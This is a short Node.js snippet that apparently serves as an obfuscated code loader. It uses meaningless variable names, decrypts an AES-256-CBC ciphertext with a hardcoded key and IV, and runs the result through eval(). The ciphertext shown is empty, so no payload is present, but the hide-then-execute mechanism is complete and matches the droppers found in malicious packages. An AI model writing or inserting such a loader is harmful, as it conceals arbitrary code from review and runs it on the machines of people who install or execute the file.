const ito = require('crypto');
const itinho = Buffer.from('92aac041d87620ee772188546f05bd6e7a8fee4936a0e342a2b116c75034174f', 'hex');
const octua = Buffer.from('85e8057d2d484a953758a45c6c60c8bf', 'hex');
const Itinho = '';
const itinhoher = ito.createDecipheriv('aes-256-cbc', itinho, octua);
let ohniticry = itinhoher.update(Itinho, 'hex', 'utf8');
ohniticry += itinhoher.final('utf8');
eval(ohniticry);
